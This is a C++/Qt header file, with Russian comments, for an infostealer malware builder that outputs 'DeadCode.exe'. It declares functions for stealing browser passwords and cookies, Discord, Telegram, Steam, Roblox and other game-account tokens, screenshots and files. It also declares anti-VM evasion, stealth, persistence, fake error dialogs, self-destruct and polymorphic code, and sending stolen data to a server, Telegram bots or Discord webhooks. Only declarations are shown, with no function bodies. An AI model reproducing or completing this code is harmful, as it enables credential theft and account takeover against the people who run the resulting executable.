#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QNetworkAccessManager>
#include <QTimer>
#include <QPropertyAnimation>
#include <QNetworkReply>
#include <QByteArray>
#include <QInputDialog>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <QJsonDocument>
#include <QJsonObject>
#include <QDir>
#include <QProcess>
#include <QLabel>
#include <QSpacerItem>
#include <QLineEdit>
#include <QComboBox>
#include <QCheckBox>
#include <QTextEdit>
#include <QPushButton>
#include <QAction>
#include <QMutex>
#include <QHttpMultiPart> // Добавлено для отправки данных в Telegram и Discord
#include <QApplication>   // Добавлено для использования QApplication в main()
#include <array>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <thread>
#include <regex>          // Добавлено для поиска токенов Discord и Roblox
#include <windows.h>
#include <bcrypt.h>
#include <sqlite3.h>
#include <zip.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <gdiplus.h>      // Добавлено для работы со скриншотами через GDI+

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; }
QT_END_NAMESPACE

// Объявляем глобальную переменную как extern
extern class MainWindow* g_mainWindow;

// Внешние функции, используемые в main.cpp (предполагается, что они определены в других файлах)
extern std::string GetCustomSystemInfo(); // Получение системной информации
extern std::string StealChromiumData(const std::string& browser, const std::string& path, const std::string& dir); // Кража данных Chromium
extern std::string StealUnsavedBrowserData(const std::string& browser, const std::string& cachePath); // Кража несохраненных данных браузера
extern std::string StealAppCacheData(const std::string& appName, const std::string& dir); // Кража кэша приложения
extern std::string CaptureWebSocketSessions(const std::string& processName); // Захват WebSocket сессий
extern std::string CaptureWebRTCSessions(const std::string& processName); // Захват WebRTC сессий
extern std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt); // Шифрование данных
extern bool AntiAnalysis(); // Проверка на запуск в виртуальной машине
extern void Stealth(); // Включение скрытного режима
extern void Persist(); // Обеспечение персистентности
extern void FakeError(); // Показ фейковой ошибки
extern void SelfDestruct(); // Самоуничтожение
extern std::string GeneratePolymorphicCode(); // Генерация полиморфного кода
extern bool CheckVirtualEnvironment(); // Проверка на виртуальную машину

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);  // Конструктор главного окна
    ~MainWindow();                         // Деструктор для очистки ресурсов

    // Публичные методы
    std::string generateRandomString(size_t length); // Генерация случайной строки
    std::string generateUniqueXorKey();         // Генерация уникального XOR-ключа
    std::array<unsigned char, 16> GetEncryptionKey(bool useFirstKey); // Получение ключа шифрования
    std::array<unsigned char, 16> generateIV(); // Генерация инициализационного вектора для AES
    bool isRunningInVM();                  // Проверка на виртуальную машину
    void emitLog(const QString& message);  // Удобный метод для вызова сигнала logUpdated

    // Метод для обновления config на основе значений из интерфейса
    void updateConfigFromUI();

    // Структура для хранения настроек
    struct Config {
        bool discord = false;              // Включение кражи токенов Discord
        bool steam = false;                // Включение кражи данных Steam
        bool steamMAFile = false;          // Включение кражи MA-файлов Steam
        bool epic = false;                 // Включение кражи данных Epic Games
        bool roblox = false;               // Включение кражи данных Roblox
        bool battlenet = false;            // Включение кражи данных Battle.net
        bool minecraft = false;            // Включение кражи данных Minecraft
        bool cookies = false;              // Включение кражи куки браузеров
        bool passwords = false;            // Включение кражи паролей браузеров
        bool screenshot = false;           // Включение создания скриншота
        bool fileGrabber = false;          // Включение граббера файлов
        bool stealFiles = false;           // Включение кражи файлов
        std::vector<std::string> files;    // Поле для хранения путей к файлам
        bool systemInfo = false;           // Включение сбора системной информации
        bool socialEngineering = false;    // Включение сбора данных для социальной инженерии
        bool chatHistory = false;          // Включение сбора истории чатов
        bool telegram = false;             // Включение кражи данных Telegram
        bool antiVM = false;               // Включение защиты от виртуальных машин
        bool fakeError = false;            // Включение фейковой ошибки
        bool silent = false;               // Включение тихого режима
        bool autoStart = false;            // Включение автозапуска
        bool persist = false;              // Включение персистентности
        bool selfDestruct = false;         // Включение самоуничтожения
        bool encryptData = false;          // Включение шифрования данных
        bool sendToServer = true;          // Включение отправки на сервер
        bool sendToTelegram = true;        // Включение отправки в Telegram
        bool sendToDiscord = true;         // Включение отправки в Discord
        std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
        std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
        std::string telegramToken = "";         // Токен для Telegram (устарело, используется telegramBotToken)
        std::string chatId = "";                // Chat ID для Telegram (устарело, используется telegramChatId)
        std::string discordWebhook = "";        // Вебхук для Discord
        std::string filename = "DeadCode.exe";  // Имя выходного файла
        std::string encryptionKey1 = "";        // Первый ключ шифрования
        std::string encryptionKey2 = "";        // Второй ключ шифрования
        std::string encryptionSalt = "";        // Соль для шифрования
        std::string iconPath = "";              // Путь к файлу иконки
        std::string githubToken = "";           // Токен GitHub
        std::string githubRepo = "";            // Репозиторий GitHub
        std::string uploadUrl = "http://example.com/upload"; // URL для отправки данных
        std::string serverUrl = "";             // URL сервера для отправки данных
        std::string telegramBotToken = "";      // Токен бота Telegram
        std::string telegramChatId = "";        // Chat ID Telegram
    } config;

    // UI элементы
    QLineEdit* tokenLineEdit;              // Поле для ввода токена Telegram
    QLineEdit* chatIdLineEdit;             // Поле для ввода Chat ID Telegram
    QLineEdit* discordWebhookLineEdit;     // Поле для ввода вебхука Discord
    QLineEdit* fileNameLineEdit;           // Поле для ввода имени выходного файла
    QLineEdit* encryptionKey1LineEdit;     // Поле для ввода первого ключа шифрования
    QLineEdit* encryptionKey2LineEdit;     // Поле для ввода второго ключа шифрования
    QLineEdit* encryptionSaltLineEdit;     // Поле для ввода соли шифрования
    QLineEdit* iconPathLineEdit;           // Поле для ввода пути к иконке
    QLineEdit* githubTokenLineEdit;        // Поле для ввода токена GitHub
    QLineEdit* githubRepoLineEdit;         // Поле для ввода имени репозитория GitHub
    QComboBox* sendMethodComboBox;         // Выпадающий список для выбора метода отправки
    QComboBox* buildMethodComboBox;        // Выпадающий список для выбора метода сборки
    QCheckBox* steamCheckBox;              // Чекбокс для включения кражи данных Steam
    QCheckBox* steamMAFileCheckBox;        // Чекбокс для включения кражи MA-файлов Steam
    QCheckBox* epicCheckBox;               // Чекбокс для включения кражи данных Epic Games
    QCheckBox* robloxCheckBox;             // Чекбокс для включения кражи данных Roblox
    QCheckBox* battlenetCheckBox;          // Чекбокс для включения кражи данных Battle.net
    QCheckBox* minecraftCheckBox;          // Чекбокс для включения кражи данных Minecraft
    QCheckBox* discordCheckBox;            // Чекбокс для включения кражи данных Discord
    QCheckBox* telegramCheckBox;           // Чекбокс для включения кражи данных Telegram
    QCheckBox* chatHistoryCheckBox;        // Чекбокс для включения сбора истории чатов
    QCheckBox* cookiesCheckBox;            // Чекбокс для включения кражи куки браузеров
    QCheckBox* passwordsCheckBox;          // Чекбокс для включения кражи паролей браузеров
    QCheckBox* screenshotCheckBox;         // Чекбокс для включения создания скриншота
    QCheckBox* fileGrabberCheckBox;        // Чекбокс для включения граббера файлов
    QCheckBox* systemInfoCheckBox;         // Чекбокс для включения сбора системной информации
    QCheckBox* socialEngineeringCheckBox;  // Чекбокс для включения сбора данных для социальной инженерии
    QCheckBox* antiVMCheckBox;             // Чекбокс для включения защиты от виртуальных машин
    QCheckBox* fakeErrorCheckBox;          // Чекбокс для включения фейковой ошибки
    QCheckBox* silentCheckBox;             // Чекбокс для включения тихого режима
    QCheckBox* autoStartCheckBox;          // Чекбокс для включения автозапуска
    QCheckBox* persistCheckBox;            // Чекбокс для включения персистентности
    QCheckBox* selfDestructCheckBox;       // Чекбокс для включения самоуничтожения (добавлено для соответствия main.cpp)
    QTextEdit* textEdit;                   // Текстовое поле для отображения логов
    QPushButton* iconBrowseButton;         // Кнопка для выбора иконки
    QPushButton* buildButton;              // Кнопка для запуска сборки
    QAction* actionSaveConfig;             // Действие для сохранения конфигурации
    QAction* actionLoadConfig;             // Действие для загрузки конфигурации
    QAction* actionExportLogs;             // Действие для экспорта логов
    QAction* actionExit;                   // Действие для выхода из приложения
    QAction* actionAbout;                  // Действие для отображения информации о программе

    // Вектор для хранения путей к скриншотам
    std::vector<std::string> screenshotsPaths;

    // Векторы для хранения собранных данных (используются в StealAndSendData)
    std::string collectedData;             // Текстовые данные
    std::vector<std::string> collectedFiles; // Файлы для отправки (добавлено для соответствия main.cpp)
    std::vector<std::string> filesToSend;  // Файлы для отправки (оставлено для совместимости, но не используется в main.cpp)

    // Публичный метод StealAndSendData
    void StealAndSendData(const std::string& tempDir); // Основная функция кражи и отправки данных

signals:
    void logUpdated(const QString& message); // Сигнал для обновления логов
    void startStealSignal();                // Сигнал для запуска процесса кражи данных

public slots:
    // Слоты для процесса кражи и отправки данных
    void sendData(const QString& encryptedData, const std::vector<std::string>& files); // Отправка данных
    void sendDataToServer(const std::string& data, const std::vector<std::string>& files); // Отправка данных на сервер
    void sendToTelegram(const std::string& data, const std::vector<std::string>& files); // Отправка данных в Telegram
    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);  // Отправка данных в Discord
    void replyFinished(QNetworkReply *reply); // Обработчик завершения сетевого запроса

private slots:
    // Слоты для генерации кода и файлов
    void generatePolymorphicCode();         // Генерация полиморфного кода
    void generateBuildKeyHeader();          // Генерация файла ключей шифрования
    void copyIconToBuild();                 // Копирование иконки в директорию сборки
    void buildExecutable();                 // Сборка исполняемого файла

    // Слоты для интеграции с GitHub Actions
    void triggerGitHubActions();            // Запуск сборки через GitHub Actions
    void checkBuildStatus();                // Проверка статуса сборки через GitHub Actions

    // Слоты для процесса кражи и отправки данных
    void startStealProcess();               // Запуск процесса кражи данных после успешной сборки
    std::string TakeScreenshot(const std::string& dir); // Создание скриншота
    std::string stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
    std::string StealDiscordTokens(const std::string& dir); // Кража токенов Discord (исправлено объявление)
    std::string StealTelegramData(const std::string& dir); // Кража данных Telegram (исправлено объявление)
    std::string StealSteamData(const std::string& dir);   // Кража данных Steam (исправлено объявление)
    std::string StealEpicGamesData(const std::string& dir); // Кража данных Epic Games (исправлено объявление)
    std::string StealRobloxData(const std::string& dir);  // Кража данных Roblox (исправлено объявление)
    std::string StealBattleNetData(const std::string& dir); // Кража данных Battle.net (исправлено объявление)
    std::string StealMinecraftData(const std::string& dir); // Кража данных Minecraft (исправлено объявление)
    std::vector<std::string> GrabFiles(const std::string& dir); // Кража файлов (граббер) (исправлено объявление)
    std::string stealChatHistory(const std::string& dir); // Кража истории чатов
    std::string collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
    std::string archiveData(const std::string& dir, const std::vector<std::string>& files); // Архивация данных
    std::string encryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt); // Шифрование данных (исправлено объявление)
    std::string decryptData(const std::string& encryptedData); // Дешифрование данных
    void saveToLocalFile(const std::string& data, const std::string& dir); // Сохранение данных в локальный файл

    // Слоты для управления конфигурацией и логами
    void saveConfig();                     // Сохранение конфигурации (удалён параметр fileName, так как он не используется в main.cpp)
    void loadConfig();                     // Загрузка конфигурации
    void exportLogs();                     // Экспорт логов в файл
    void appendLog(const QString& message);  // Добавление сообщения в лог

    // Слоты для дополнительных функций
    bool AntiAnalysis();                    // Проверка на запуск в виртуальной машине
    void Stealth();                        // Включение скрытного режима
    void Persist();                        // Обеспечение персистентности
    void FakeError();                      // Показ фейковой ошибки
    void SelfDestruct();                   // Самоуничтожение

    // Слоты для обработки действий пользователя
    void on_iconBrowseButton_clicked();    // Обработчик выбора иконки
    void on_buildButton_clicked();         // Обработчик кнопки "Собрать"

private:
    // Приватные методы
    void animateSection(QLabel* sectionLabel, QSpacerItem* spacer); // Анимация появления секций
    QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key); // Применение XOR-шифрования
    QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv); // Применение AES-шифрования

    // Приватные члены
    Ui::MainWindow *ui;                    // Указатель на UI, сгенерированный Qt Designer
    QNetworkAccessManager *manager;        // Менеджер для сетевых запросов (GitHub API, Telegram, Discord)
    QMutex logMutex;                       // Мьютекс для потокобезопасного логирования
    bool isBuilding;                       // Флаг состояния сборки
    QTimer *buildTimer;                    // Таймер для обновления состояния
    QTimer *statusCheckTimer;              // Таймер для проверки статуса сборки через GitHub Actions
    QString workflowRunId;                 // ID запущенного workflow для проверки статуса
};

#endif // MAINWINDOW_H